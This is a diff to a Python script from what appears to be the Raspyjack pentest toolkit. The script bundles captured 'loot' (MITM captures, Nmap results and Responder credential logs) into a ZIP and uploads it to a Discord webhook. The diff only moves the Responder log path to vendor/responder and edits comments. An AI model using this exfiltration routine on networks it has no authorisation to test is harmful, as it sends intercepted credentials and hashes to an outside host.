@@ -6,7 +6,7 @@ This script gathers:
 
 * everything under the local **loot/** folder, **including** the *MITM/*
   and *Nmap/* sub‑directories;
-* every file in **./Responder/logs/**
+* every file in **./vendor/responder/logs/**
 
 …bundles them into a single **ZIP archive** and uploads it as an
 attachment to a Discord *webhook*.
@@ -47,13 +47,13 @@ except ModuleNotFoundError as exc:
 LOOT_DIR       = Path("/root/Raspyjack/loot")
 MITM_DIR       = LOOT_DIR / "MITM"
 NMAP_DIR       = LOOT_DIR / "Nmap"
-RESPONDER_DIR  = Path("/root/Raspyjack/Responder") / "logs"
+RESPONDER_DIR  = Path("/root/Raspyjack/vendor/responder") / "logs"
 
 WEBHOOK_FILE = Path("/root/Raspyjack/discord_webhook.txt")
 
 
 def _load_webhook_url():
-    """Load webhook URL from system config (shared with raspyjack.py)."""
+    """Load webhook URL from system config shared with the WebUI."""
     try:
         if WEBHOOK_FILE.exists():
             for line in WEBHOOK_FILE.read_text().splitlines():
@@ -94,7 +94,7 @@ def add_directory_to_zip(zip_file: zipfile.ZipFile, base_dir: Path, arc_prefix: 
     """
     for path in base_dir.rglob("*"):
         if path.is_file():
-            # Relative path inside the ZIP, e.g. «Responder/logs/foo.txt»
+            # Relative path inside the ZIP, e.g. «vendor/responder/logs/foo.txt»
             arcname = os.path.join(arc_prefix, path.relative_to(base_dir.parent).as_posix())
             zip_file.write(path, arcname)
 
@@ -109,9 +109,9 @@ def build_archive() -> io.BytesIO:
         if LOOT_DIR.exists():
             add_directory_to_zip(zf, LOOT_DIR)
 
-        # Responder logs go under «Responder/logs/» inside the archive
+        # Responder logs go under «vendor/responder/logs/» inside the archive
         if RESPONDER_DIR.exists():
-            add_directory_to_zip(zf, RESPONDER_DIR, arc_prefix="Responder/logs")
+            add_directory_to_zip(zf, RESPONDER_DIR, arc_prefix="vendor/responder/logs")
 
     buf.seek(0)  # rewind so .read() returns the full archive
     return buf
@@ -170,4 +170,3 @@ def main() -> None:
 # ---------------------------------------------------------------------------
 if __name__ == "__main__":
     main()
-
